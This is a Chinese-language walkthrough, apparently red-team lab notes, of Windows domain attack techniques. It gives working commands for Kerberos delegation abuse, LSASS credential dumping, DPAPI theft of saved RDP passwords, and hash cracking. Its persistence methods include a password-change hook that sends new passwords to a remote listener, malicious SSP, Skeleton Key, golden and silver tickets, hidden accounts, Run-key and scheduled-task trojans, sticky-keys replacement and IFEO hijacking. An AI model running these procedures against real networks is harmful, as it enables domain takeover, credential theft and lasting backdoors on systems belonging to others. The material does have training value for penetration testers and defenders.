```
setspn -U -A priv/test webadmin #域控输入
```

机器设置，机器设置仅信任此计算机指定服务-cifs

<img src=".\图片\Snipaste_2022-12-16_23-05-26.png" alt="Snipaste_2022-12-16_23-05-26" style="zoom:67%;" />

用户设置，用户设置仅信任此计算机指定服务-cifs

<img src=".\图片\Snipaste_2022-12-16_23-07-20.png" alt="Snipaste_2022-12-16_23-07-20" style="zoom:67%;" />

#### 步骤

注意条件：仍需要高权限

1、查询机器用户（主机）配置约束委派

```
AdFind -b "DC=god,DC=org" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
```

<img src=".\图片\Snipaste_2022-12-16_23-10-31.png" alt="Snipaste_2022-12-16_23-10-31" style="zoom: 67%;" />

2、查询服务账户（主机）配置约束委派

```
AdFind -b "DC=god,DC=org" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
```

<img src=".\图片\Snipaste_2022-12-16_23-11-29.png" alt="Snipaste_2022-12-16_23-11-29" style="zoom:67%;" />

3、获取用户的票据

```
kekeo "tgt::ask /user:webadmin /domain:god.org /password::admin!@#45 /ticket:administrator.kirbi" "exit"
kekeo "tgt::ask /user:webadmin /domain:god.org /NTLM:518b98ad4178a53695dc997aa02d455c /ticket:administrator.kirbi" "exit"

# TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi
```

<img src=".\图片\Snipaste_2022-12-16_23-22-32.png" alt="Snipaste_2022-12-16_23-22-32" style="zoom:67%;" />

4、利用用户票据获取域控票据

```
kekeo "tgs::s4u /tgt:TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa2010cn-god" "exit"
kekeo "tgs::s4u /tgt:TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa2010cn-god.god.org" "exit"

# TGS_Administrator@god.org@GOD.ORG_cifs~owa2010cn-god.god.org@GOD.ORG.kirbi
```

<img src=".\图片\Snipaste_2022-12-16_23-25-39.png" alt="Snipaste_2022-12-16_23-25-39" style="zoom:67%;" />

5、导入票据到内存，连接通讯域控

```
mimikatz kerberos::ptt TGS_Administrator@god.org@GOD.ORG_cifs~owa2010cn-god.god.org@GOD.ORG.kirbi

shell dir \\owa2010cn-god.god.org\c$
```



<img src=".\图片\Snipaste_2022-12-16_23-27-11.png" alt="Snipaste_2022-12-16_23-27-11" style="zoom:80%;" />

6、后续利用 copy&at

```
copy beacon.exe \\192.168.3.21\c$  #拷贝执行文件到目标机器
at \\192.168.3.21 15:47 c:\beacon.exe   #添加计划任务
```

#### 总结

我们需要找到配置了**约束委派的主机和对应的服务**才能完成，不需要引诱钓鱼之类的，全程在已攻陷的主机上完成

### 基于资源的约束委派

https://xz.aliyun.com/t/11555

#### 原理

简述：如果一个域用户的主机被控，会导致**用同一个该域用户加入域的多台主机**被攻击

基于资源的约束委派(RBCD)是在**Windows Server 2012**中新加入的功能，与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。RBCD把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。也就是说机器自身可以直接在自己账户上配置msDS-AllowedToActOnBehalfOfOtherIdentity属性来设置RBCD

条件：域控Windows2012及以上，存在主机用域内成员用户加入域操作，且不需要高权限就可以攻击

**将机器账户加入域时得输入一个域用户的账户密码**

<img src=".\图片\Snipaste_2022-12-17_17-23-31.png" alt="Snipaste_2022-12-17_17-23-31" style="zoom:60%;" />

#### 步骤

以下操作全程只需用**该普通域用户**权限执行

1、获取受害目标，有哪些域内计算机**存在同一用户加入**的

```
AdFind.exe -h 192.168.3.33 -b "DC=xiaodi,DC=local" -f "objectClass=computer" mS-DS-CreatorSID
# S-1-5-21-1695257952-3088263962-2055235443-1104
# DATA主机和WEB主机的SID值都一致，可以确定这两台主机都是使用同一域内用户账户入域
```

<img src=".\图片\Snipaste_2022-12-17_16-09-10.png" alt="Snipaste_2022-12-17_16-09-10"  />

2、判断这个**同一用户**是谁，如果已经取得这个同一用户的权限最好，如果没取得那就去攻击那个**同一用户**的主机

https://github.com/bgtiban/Sid2User

```
sid2user.exe \\192.168.3.33 5 21 1695257952 3088263962 2055235443 1104  # 后面参数是该用户的 SID

# 显然这个用户是 dbadmin ，为我们已经取得的权限
```

<img src=".\图片\Snipaste_2022-12-17_16-19-06.png" alt="Snipaste_2022-12-17_16-19-06"  />

3、增加机器  https://github.com/Kevin-Robertson/Powermad

```
Set-ExecutionPolicy Bypass -Scope Process    # 修改powershell执行限制
Import-Module .\Powermad.ps1                 #引入powershell脚本
                                             # 添加一台密码为123456 的机器 serviceA
New-MachineAccount -MachineAccount serviceA -Password $(ConvertTo-SecureString "123456" -AsPlainText -Force)
```

4、获取新添加的机器 serviceA 的 sid

https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

```
Import-Module .\PowerView.ps1
Get-NetComputer serviceA -Properties objectsid

# S-1-5-21-1695257952-3088263962-2055235443-1602     
```

5、设置修改属性

```
Set-ExecutionPolicy Bypass -Scope Process
import-module .\powerview.ps1

# 注意修改sid值
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1695257952-3088263962-2055235443-1602)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# DATA为工具目标的主机名字
Get-DomainComputer DATA| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

```

<img src=".\图片\Snipaste_2022-12-17_16-36-34.png" alt="Snipaste_2022-12-17_16-36-34"  />

6、连接目标，cs 建立代理，绑定hosts

```
192.168.3.11 web.xiaodi.org
192.168.3.22 data.xiaodi.org
192.168.3.33 dc.xiaodi.org
192.168.3.33 xiaodi.org
```

7、利用 impacket 套件中的 getST.py 导出票据

```
python getST.py -dc-ip 192.168.3.33 xiaodi.local/serviceA\$:123456 -spn cifs/data.xiaodi.local -impersonate administrator
```

<img src=".\图片\Snipaste_2022-12-17_16-55-35.png" alt="Snipaste_2022-12-17_16-55-35" style="zoom:80%;" />

8、生成票据上传到win7，导入票据到内存

```
beacon> mimikatz kerberos::ptc administrator.ccache
beacon> shell dir \\data.xiaodi.local\c$
```

<img src=".\图片\Snipaste_2022-12-17_16-59-38.png" alt="Snipaste_2022-12-17_16-59-38" style="zoom:80%;" />

8.5、使用工具连接

```
python psexec.py -k xiaodi.local/administrator@data.xiaodi.local -no-pass
```

### 关于mimikatz读取不到明文密码

#### 前戏

用 cs 在 webserver 上建立转发上线的监听器，再用 cs 上的插件 psexec 横向到 sqlserver，在 sqlserver 里操作

<img src=".\图片\Snipaste_2022-12-19_18-06-12.png" alt="Snipaste_2022-12-19_18-06-12" style="zoom:50%;" />

mimikatz 读取

```
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
```

winserver2012 读取不到明文密码

<img src=".\图片\Snipaste_2022-12-19_17-25-12.png" alt="Snipaste_2022-12-19_17-25-12" style="zoom:50%;" />

#### 可能原因

1、winserver12 或 win10 以上默认打了 KB2871997 补丁，关闭了Wdigest功能

2、mimikatz 被防火墙杀掉了

#### 解决方案

##### 离线读取

Procdump是微软官方的工具，可在命令行将lsass导出且杀软不会拦截

https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump

```
beacon> shell Procdump -accepteula -ma lsass.exe lsass.dmp
```

把文件下载到本地然后利用mimikatz读取

```
sekurlsa::minidump lsass.DMP
```

将读取数据还原

```
sekurlsa::logonPasswords full
```

<img src=".\图片\Snipaste_2022-12-19_17-40-17.png" alt="Snipaste_2022-12-19_17-40-17" style="zoom:80%;" />

此方法重点解决的是**mimikatz被杀掉**的处理方法

##### 解决版本winserver>=2012

高权限**强制开启注册表**，让Wdigest Auth保存明文口令方式

```
beacon> shell reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\ /v UseLogonCredential /t REG_DWORD /d 1
```

然后将机器锁屏重新登录，再次抓取密码

<img src=".\图片\Snipaste_2022-12-19_17-46-57.png" alt="Snipaste_2022-12-19_17-46-57" style="zoom:80%;" />

##### HASH破解

这个方法属于实在搞不出来明文，尝试的撞库的破解方法，hashcat使用如下

https://www.cnblogs.com/Junglezt/p/16044372.html
https://blog.csdn.net/weixin_50464560/article/details/120578225

字典破解

```
.\hashcat.exe -a 0 -m 1000 hash.txt pass.txt
```

暴力破解

```
.\hashcat.exe -a 0 -m 1000 hash.txt pass.txt
```

##### RDP凭据抓取

这里先使用 mstsc 远程连接其他主机，记住要点击保存凭据才可以

<img src=".\图片\9dxsuZWjbEPQMl2vx1HSBA1.png" alt="9dxsuZWjbEPQMl2vx1HSBA1" style="zoom: 67%;" />

###### 步骤

1-使用以下命令查看是否有rdp连接记录，要在webadmin权限执行，system上显示没有

```
shell cmdkey /list
```

使用命令查看rdp储存的凭据文件名

```
shell dir /a %userprofile%\appdata\local\microsoft\credentials\*
# 记录该文件名 99149C3884E841134091082C3D675F52
```

2-用命令

```
mimikatz dpapi::cred /in:C:\Users\webadmin\appdata\local\microsoft\credentials\99149C3884E841134091082C3D675F52
# 记录其中的 guidMasterKey 对应的值 b0bf43b5-d85b-4448-96c4-9c006443bf46
```

3-用命令

```
mimikatz sekurlsa::dpapi
# 得到大量数据后，copy下来 查找刚刚得到的值 得到新的MasterKey所对应的值
#3ff2c989572c447ff66ae6be236542120b2b3b938f257e7f0082dc55c6c3dd2e050fa4e8b691571833baa35307b4da8c8aa1273ccb9716c74179735f5c128b97
```

4-构造命令

```
mimikatz dpapi::cred /in:C:\Users\webadmin\appdata\local\microsoft\credentials\99149C3884E841134091082C3D675F52 /masterkey:3ff2c989572c447ff66ae6be236542120b2b3b938f257e7f0082dc55c6c3dd2e050fa4e8b691571833baa35307b4da8c8aa1273ccb9716c74179735f5c128b97
# 其中的 99149那一长串数字是第一步得到的文件名 后面的 3ff2c 是最后得到的值
```

运行后查看数据得到明文账密

#### 关于linux上的密码破解

##### 密码读取

https://github.com/huntergregal/mimipenguin

```
chmod 755 ./mimipenguin.sh
./mimipenguin.sh
```

##### 密码破解

```
cat /etc/shadow
hashcat.exe -a 3 -m 1800 linuxhash.txt pass.txt
```

## 权限维持

https://www.cnblogs.com/lcxblogs/p/14216525.html

### 基于验证DLL加载-SSP

简单的理解为 SSP 就是一个 DLL，用来实现身份认证，并且维持系统权限

#### 方法一

利用mimikatz，在其内部运行

```
privilege::debug
misc::memssp
```

该命令会在`C:\Windows\System32\mimilsa.log`记录登录的账号密码(只用在用户注销然后登录后才会记录)

<img src=".\图片\Snipaste_2022-12-21_16-40-38.png" alt="Snipaste_2022-12-21_16-40-38" style="zoom:80%;" />

注意：**如果域控制器重启，被注入内存的伪造的SSP将会丢失**

#### 方法二

1、把 mimkatz 中的 mimilib.dll 传到目标域控的`C:\windows\system32\`目录下

2、修改注册表，重启生效

```
# 查看当前注册表中的设置值
reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

# 修改注册表中的值
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ

# mimilib 为 mimkatz 中的 mimilib.dll，可改名
```

<img src=".\图片\Snipaste_2022-12-21_16-46-42.png" alt="Snipaste_2022-12-21_16-46-42" style="zoom: 67%;" />

命令执行完成后会在注册添加一个mimilib也就是会调用mimilib.dll，`\0`是换行
重启生效后会在`C:\windows\system32\kiwissp.log` 记录账号密码文件

<img src=".\图片\Snipaste_2022-12-21_16-57-43.png" alt="Snipaste_2022-12-21_16-57-43" style="zoom: 67%;" />

#### 总结

这两种方法一种重启后会失效，一种重启后才会成功，建议一起用。可保存明文密码到本机，可以在域环境和单机环境使用，也很容易被对方发现。也有可能存在文件无法读取的情况，可以尝试利用把生成的日志密码文件共享或者发送到内网被控机器或者临时邮箱

### 基于验证DLL加载-HOOK

Hook PasswordChangeNotify 的作用是当用户**修改密码后**在系统中进行同步

https://github.com/clymb3r/Misc-Windows-Hacking   #本地版

https://github.com/wh0Nsq/HookPasswordChange    #远程版

https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1

#### 本地版

生成解决方案时可修改密码保存的位置

<img src=".\图片\Snipaste_2022-12-21_17-11-26.png" alt="Snipaste_2022-12-21_17-11-26" style="zoom:67%;" />

生成后和`HookPasswordChangeNotify.ps1`放在一起
[<img src=".\图片\1667355270767-d0b763d7-f6e6-4d95-9380-67460dcf1f22.png" alt="image.png" style="zoom:80%;" />]
在`HookPasswordChangeNotify.ps1`最后添加一行代码

```
Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll –procname lsass
```

[<img src=".\图片\1667356062719-f64dea06-4c78-4b49-a40f-a9d38461311f.png" alt="image.png" style="zoom:80%;" />
该powershell脚本最后会调用刚才生成的dll文件

```
.\HookPasswordChangeNotify.ps1
```

**当用户修改密码时**,新的密码就会记录在`C:\Windows\Temp\passwords.txt`
<img src=".\图片\1667356354865-4a02e69c-20de-4d60-a026-10c2a74f9c89.png" alt="image.png" style="zoom: 67%;" />

#### 远程版

同样是将密码保存到指定目录
<img src=".\图片\1667357762746-acd8059e-567f-4895-a7a2-5b4d961dd1be.png" alt="image.png" style="zoom:80%;" />
但是该代码还可以将数据发送到远程服务器
<img src=".\图片\1667358075087-f6fc50d7-4960-43e3-952c-7c721d389f28.png" alt="image.png" style="zoom:80%;" />
调用dll会将密码发送值指定地址端口
生成后和`HookPasswordChangeNotify.ps1`放在一起
<img src=".\图片\1667355270767-d0b763d7-f6e6-4d95-9380-67460dcf1f211.png" alt="image.png" style="zoom:80%;" />
在`HookPasswordChangeNotify.ps1`最后添加一行代码

```
Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll –procname lsass
```

<img src=".\图片\1667356062719-f64dea06-4c78-4b49-a40f-a9d38461311af.png" alt="image.png" style="zoom:80%;" />
该powershell脚本最后会调用刚才生成的dll文件

```
.\HookPasswordChangeNotify.ps1
```

同样也是修改密码时触发
接受端主机开启nc监听
<img src=".\图片\1667358241717-5d6d3281-3a4d-4644-b646-db1621e14283.png" alt="image.png" style="zoom:67%;" />

#### 总结

这个方法是在被控主机修改密码时才有效

### 基于机制账号启用-DSRM

DSRM（Diretcory Service Restore Mode，目录服务恢复模式）是windows域环境中域控制器的安全模式启动选项。域控制器的本地管理员账户也就是DSRM账户，DSRM密码是在DC创建时设置的，一般很少更改

DSRM的用途是：允许管理员在域环境出现故障时**还原、修复、重建活动目录**数据库

通过在DC上运行 ntdsutil 工具可以修改DSRM密码

#### 步骤

1~3步在域控上做，第4步在 webserver 上做

**1.获取dsrm及krbtgt的NTLM hash**

```
privilege::debug
lsadump::lsa /patch /name:krbtgt
token::elevate
lsadump::sam
```

krbtgt是Kerberos认证中的用户,获得该用户hash我们就可以随时登录

<img src=".\图片\Snipaste_2022-12-21_17-36-47.png" alt="Snipaste_2022-12-21_17-36-47" style="zoom:80%;" />

<img src=".\图片\Snipaste_2022-12-21_17-37-16.png" alt="Snipaste_2022-12-21_17-37-16" style="zoom:80%;" />

**2.dsrm&krbtgt&NTLM hash同步**

该操作将 dsrm 的 hash 和 krbtgt 保持同步

```
#进入ntdsutil
ntdsutil
#修改DSRM的密码
set DSRM password
#使DSRM的密码和指定域用户的密码同步 eg:sync from domain account [域用户名]
sync from domain account krbtgt
#退出
按两次q即可退出(第1次：退出DSRM密码设置模式;第2次退出ntdsutil)
```

<img src=".\图片\Snipaste_2022-12-21_17-52-17.png" alt="Snipaste_2022-12-21_17-52-17" style="zoom: 80%;" />

<img src=".\图片\Snipaste_2022-12-21_17-54-21.png" alt="Snipaste_2022-12-21_17-54-21"  />

**3.修改dsrm登录方式**

```
#powershel执行
New-ItemProperty "hklm:\system\currentcontrolset\control\lsa\" -name "dsrmadminlogonbehavior" -value 2 -propertyType DWORD
```

<img src=".\图片\Snipaste_2022-12-21_17-56-28.png" alt="Snipaste_2022-12-21_17-56-28" style="zoom:80%;" />

dsrmadminlogonbehavior 代表的是 DSRM有三种登录方式

- 0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号
- 1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器
- 2：在任何情况下，都可以使用DSRM管理员账号登录域控制器

**4.利用PTH传递攻击**

在 webserver 上基于  krbtgt 账号的 ntlm 进行哈希传递，此处用的是 mimikatz

```
privilege::debug
sekurlsa::pth /domain:owa2010cn-god /user:administrator /ntlm:b097d7ed97495408e1537f706c357fc5
# ntlm 值为之前 krbtgt 账号的
dir \\owa2010cn-god\c$
```

<img src=".\图片\Snipaste_2022-12-21_18-07-59.png" alt="Snipaste_2022-12-21_18-07-59" style="zoom: 67%;" />

#### 总结

注意：此时是需要在其它域内主机上连接域控，还需要高权限使用 mimikatz。我们可以优先使用套件里的工具实现哈希传递

利用系统自带机制模式DSRM，修改DSRM默认登录方式和属性，通过其同步krgtgt进行PTH攻击，实现持续化控制，但适用于系统=>windows server2008。每个域控制器都有本地管理员账号和密码（与域管理员账号和密码不同）。DSRM账号可以作为一个域控制器的本地管理员用户，通过网络连接域控制器，进而控制域控制器

### 基于用户属性修改-SID-history

SID即安全标识符（Security Identifiers），是标识用户、组和计算机帐户的唯一的号码。在第一次创建该帐户时，将给网络上的每一个帐户发布一个唯一的 SID
SIDHistory属性的存在是为了解决用户在迁移到另一个域中的时候权限会改变的问题。例如用户zhangsan在A域中本来是管理员，迁移到B域的时候因为sid的改变有可能会变成普通用户权限，这时候如果给zhangsan用户添加一个值为zhangsan在A域中的SID的SIDHistory值就可以解决这个问题，只有域管有更改SIDHistory的权利

以下操作 1~3步在  DC 上操作，第四步在webserver 上用 webadmin 用户操作

#### 1、获取所有用户的sid值

```
wmic useraccount get name,sid
```

<img src=".\图片\Snipaste_2022-12-21_18-17-16.png" alt="Snipaste_2022-12-21_18-17-16" style="zoom:67%;" />

可以发现只有后四位不同而且前几个为三位，这里的sid就代表了权限不同

#### 2、获取某用户SID属性

powershell 运行

```
Import-Module ActiveDirectory
Get-ADUser webadmin -Properties sidhistory
```

<img src=".\图片\Snipaste_2022-12-21_18-20-00.png" alt="Snipaste_2022-12-21_18-20-00" style="zoom:80%;" />

#### 3、给予某用户administrator属性

利用mimikatz

```
privilege::debug
sid::patch
sid::add /sam:webadmin /new:administrator
```

<img src=".\图片\Snipaste_2022-12-21_18-25-25.png" alt="Snipaste_2022-12-21_18-25-25" style="zoom:80%;" />

#### 4、webadmin 访问 DC

```
dir \\192.168.3.21\c$
```

<img src=".\图片\Snipaste_2022-12-21_18-27-45.png" alt="Snipaste_2022-12-21_18-27-45" style="zoom:50%;" />

#### 总结

该方法是把域控管理员的SID加入到其他某个恶意的域账户的SID History中，然后，这个恶意的（我们自己创建的）域账户就可以以域管理员权限访问域控了，**不修改域账户则一直存在**

### 基于登录进程劫持-Skeleton-Key

使用mimikatz命令，即可产生万能密码 mimikatz 但是**重启后就会失效**

**1、测试域内某个用户与DC通讯**

```
dir \\owa2010cn-god\c$
```

无法成功

**2、连接DC后，DC注入lsass进程**

```
net use \\192.168.3.21\ipc$ "Admin12345" /user:god\administrator
```

域控利用mimikatz：

```
privilege::debug
misc::skeleton
```

**3、重新测试域内某个用户与DC通讯**

```
net use \\owa2010cn-god\ipc$ "mimikatz" /user:god\administrator
dir \\owa2010cn-god\c$
```

<img src=".\图片\Snipaste_2022-12-21_18-36-18.png" alt="Snipaste_2022-12-21_18-36-18" style="zoom:67%;" />

因为Skeleton Key技术是被注入到lsass.exe进程的，**所以它只存在内存中，如域控重启，万能密码将失效**。

### 隐藏用户

https://github.com/wgpsec/CreateHiddenAccount

添加用户时在**用户名后面**加上 `$` 符号后，会有隐藏的功能，但在活动目录里可以看到用户名

<img src=".\图片\Snipaste_2022-12-22_15-21-13.png" alt="Snipaste_2022-12-22_15-21-13" style="zoom:67%;" />

删除用户名为

```
net user zfy$ /del
```

于是我们使用工具 CreateHiddenAccount 示范

#### 域环境版

```
CreateHiddenAccount_upx_v0.2 -u test -p Test!@#45
```

<img src=".\图片\Snipaste_2022-12-22_15-26-56.png" alt="Snipaste_2022-12-22_15-26-56" style="zoom:67%;" />

这里在活动目录中选中`test$`使用右键是可以删除的，也可以使用脚本查看是否存在隐藏用户

```
CreateHiddenAccount_upx_v0.2 -c
```

<img src=".\图片\Snipaste_2022-12-22_15-29-49.png" alt="Snipaste_2022-12-22_15-29-49" style="zoom:80%;" />

#### 单机版

操作与域环境版一致，但是创建出来的隐藏用户 `test$`是无法被删除，原因是它不属于任何组

### 基于软件-GotoHTTP&RustDesk

传统木马类似msf或cs生成出来的有**协议**的限制，也存在**免杀**的问题，出现这种情况时。可以用一些市面上的**远控软件**做到权限维持的作用，这些软件不会被杀掉

#### GotoHTTP

https://gotohttp.com/goto/download.12x

需要**有网络**，B2C模式，无需安装控制端软件，有浏览器就可以远控。流量走https协议，只要目标放行443端口出口就可以实现内网穿透。在低带宽也可以使用，运行占用内存极低，控制时占用CPU仅为0%-3%。被控端在类Linux系统上支持图形界面（GUI）和字符界面（CLI）。网络唤醒远程主机需加载驱动，导致运行时安全卫士会拦截这行为，其他杀软不会拦截

<img src=".\图片\Snipaste_2022-12-22_15-40-11.png" alt="Snipaste_2022-12-22_15-40-11"  />

运行后会在当前目录生成`gotohttp.ini`配置文件，可以读取相应 **ID** 和**控制码**

<img src=".\图片\Snipaste_2022-12-22_15-42-40.png" alt="Snipaste_2022-12-22_15-42-40" style="zoom:67%;" />

控制端再直接上浏览器访问 https://sh.gotohttp.com 连接

<img src=".\图片\Snipaste_2022-12-22_15-44-58.png" alt="Snipaste_2022-12-22_15-44-58" style="zoom: 50%;" />

#### RustDesk

https://github.com/rustdesk/rustdesk
利用场景：无需外网，可以用一台内网主机连接被控端，需要绕过杀毒等网络防护

##### 有外网

直接运行软件，账号密码在配置文件位置`C:\Users\用户名\AppData\Roaming\RustDesk\config\RustDesk.toml`

<img src=".\图片\Snipaste_2022-12-22_15-49-57.png" alt="Snipaste_2022-12-22_15-49-57" style="zoom:67%;" />

远控端和被控端运行的是同一个软件，在控制端输入 **ID 和密码**连接

<img src=".\图片\Snipaste_2022-12-22_15-52-17.png" alt="Snipaste_2022-12-22_15-52-17" style="zoom:67%;" />

##### 无外网有内网

修改`RustDesk2.toml`文件

```
direct-server = 'Y'
direct-access-port = '8443'
```

然后利用同网段主机进行连接

<img src=".\图片\Snipaste_2022-12-22_15-59-38.png" alt="Snipaste_2022-12-22_15-59-38" style="zoom:80%;" />

### 基于服务TGT-黄金白银票据

https://txluck.github.io/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/

#### 黄金票据

⻩⾦票据⽣成攻击，是⽣成有效的TGT Kerberos票据，并且不受TGT⽣命周期的影响（TGT默认10⼩时，最多续订7天），这⾥可以为任意⽤户⽣成⻩⾦票据，然后为域管理员⽣成TGT，这样普通⽤户就可以变成域管理员

##### 利用条件

1、已经拿下域管理员（域名称，域的 SID 值，域的 KRBTGT 账号的 HASH 4，伪造任意用户名），获取到`krbtgt hash`
2、利用`krbtgt`的hash制作黄金票据工具，进行攻击

此为权限维持的手段而非横向移动，因为只有拿下域控了才有机会搞到**KRBTGT 账号的 HASH**

第⼀次拿到域管权限之后，需要将krbtgt NTLM hash进⾏保存，当第⼆次再来进⾏域渗透攻击时，我们就可使⽤krbtgt的NTLM hash制作⻩⾦票据

##### 步骤

1、获取域名

<img src=".\图片\Snipaste_2022-12-22_16-10-21.png" alt="Snipaste_2022-12-22_16-10-21"  />

2、获取域的SID值，不需要后四位

```
whoami /user
whoami /all
wmic useraccount get name,sid
```

`S-1-5-21-1218902331-2157346161-1782232778`

3、获取域的**KRBTGT 账号的 HASH**

```
#mimikatz 需要用域管账户获取
privilege::debug
lsadump::lsa /patch
```

<img src=".\图片\Snipaste_2022-12-22_16-17-19.png" alt="Snipaste_2022-12-22_16-17-19"  />

`b097d7ed97495408e1537f706c357fc5`

4、伪造用户名：webadmin（任意用户名）

生成票据，在 webserver 上运行

```
#mimkatz
kerberos::golden /user:webadmin /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /krbtgt:b097d7ed97495408e1537f706c357fc5 /ticket:g
```

导入内存

```
kerberos::ptt g
```

用 webserver 访问测试

```
dir \\owa2010cn-god\c$
```

<img src=".\图片\Snipaste_2022-12-22_16-23-47.png" alt="Snipaste_2022-12-22_16-23-47" style="zoom:67%;" />

#### 白银票据

白银票据（SILVER TICKET）是利用域的服务账户进行伪造的ST，在Kerberos认证的第三步，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后，通过自己的Master Key 解密ST，从而获得 Session Key。所以只需要知道Server用户的Hash就可以伪造出一个ST，且不会经过KDC，但是伪造的门票只对部分服务起作用（不需要交互KDC，需要知道Server的NTLM Hash）

##### 利用条件

1、已经拿下域管理员，获取到DC hash；
2、利用DC的hash制作白银票据工具，进行攻击

##### 流程

1、获取域名

```
net config workstation
```

<img src=".\图片\Snipaste_2022-12-22_16-28-39.png" alt="Snipaste_2022-12-22_16-28-39" style="zoom:80%;" />

2、获取域的SID值

```
whoami /user
whoami /all
wmic useraccount get name,sid
```

`S-1-5-21-1218902331-2157346161-1782232778`

3、获取 `DC` 主机账户`NTLM-HASH`

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit">1.txt
# 4a0d2c7efb72b4fb0d113b5d3f9993cd
```

<img src=".\图片\Snipaste_2022-12-22_16-40-46.png" alt="Snipaste_2022-12-22_16-40-46" style="zoom: 67%;" />

4、伪造用户名：dbadmin（任意用户名）
导入票据：（CIFS文件共享服务）

```
domain：域名
sid：域环境下的SID，除去最后-的部分剩下的内容
target：要访问的服务器，写FQDN
rc4：写的是目标主机的NTLM（主机名$对应NTLM）
service：要访问的资源类型
user：伪造的用户
cifs：共享文件
kerberos::golden /domain:<域名> /sid:<域 SID> /target:<目标服务器主机名> /service:<服务类型> /rc4:<NTLM Hash> /user:<用户名> /ptt
kerberos::golden /user:webadmin /domain:god.org /sid:S-1-5-21-1218902331-2157346161-17822
```

```
kerberos::golden /user:dbadmin /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /target:owa2010cn-god.god.org /service:cifs /rc4:4a0d2c7efb72b4fb0d113b5d3f9993cd /ptt
```

5、用`dbadmin`测试通讯

```
dir \\owa2010cn-god\c$
```

<img src=".\图片\Snipaste_2022-12-22_16-49-08.png" alt="Snipaste_2022-12-22_16-49-08" style="zoom: 67%;" />

##### 总结

1、伪造的ST，**只能访问指定的服务**，如CIFS
2、不与KDC交互，直接访问Server
3、ST由服务账号 NTLM Hash 加密

#### 金票银票的区别

##### 获取的权限不同 

金票：伪造的 TGT，可以获取任意 Kerberos 的访问权限

银票：伪造的 ST，只能访问指定的服务

##### CIFS 认证流程不同 

金票：同 KDC 交互，但不同 AS 交互 

银票：不同 KDC 交互，直接访问 Server 

##### 加密方式不同 

金票：由 krbtgt NTLM Hash 加密 

银票：由服务账号 NTLM Hash 加密

### 自启动

以各种方式将木马添加到服务器**启动项**里，重启便运行木马

#### 1、自启动路径加载

将木马放到以下目录，重启机器即加载**启动项**运行木马

```
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
```

#### 2、自启动服务加载

一样是重启运行木马

```
#创建自启动服务 路径执行木马
sc create ServiceTest binPath= C:\test.exe start= auto
#删除该服务
sc delete ServiceTest
```

#### 3、自启动注册表加载

打开注册表：`regedit`

当前用户键值注册表路径:
`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
服务器键值注册表路径（需要管理员权限）:
`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
添加启动项

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "backdoor" /t REG_SZ /F /D "C:\1111.exe"
```

<img src=".\图片\Snipaste_2022-12-24_14-00-46.png" alt="Snipaste_2022-12-24_14-00-46" style="zoom:50%;" />

<img src=".\图片\Snipaste_2022-12-24_14-01-27.png" alt="Snipaste_2022-12-24_14-01-27" style="zoom:80%;" />

#### 4、计划计时任务

和横向移动`at`命令相同

```
#每天01:02，以system权限启动木马
schtasks /Create /TN TestService2 /SC DAILY /ST 01:02 /TR c:\1111.exe /RL HIGHEST
```

### 粘滞键

系统**自带的辅助功能**进行替换执行，放大镜，旁白，屏幕键盘、IE浏览器等均可
粘滞键位置：
`c:\windows\system32\sethc.exe`

```
move sethc.exe sethc1.exe
copy cmd.exe sethc.exe
```

### 映像劫持

映像劫持是利用Windows的IFEO（Image File Execution Options）功能来实现的。IFEO实际上是Windows的一项正常功能，主要用于调试程序，其初衷是在**程序启动的时候开启调试器来调试程序**，这样一来可以在调试器中观察程序在难以重现的环境中的行为。例如，某个程序在随用户登录自动启动时会出错，但在登录后手动启动时却一切正常，这就可以通过IFEO设置一个调试器，无论程序何时启动，都会开启这个调试器对其进行调试，以便找出问题。很多病毒木马都会使用这种手段阻止安全软件的运行

#### 例子

测试：执行`notepad`变为`计算器calc`

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe /c calc"
```

<img src=".\图片\Snipaste_2022-12-24_14-09-36.png" alt="Snipaste_2022-12-24_14-09-36" style="zoom:80%;" />

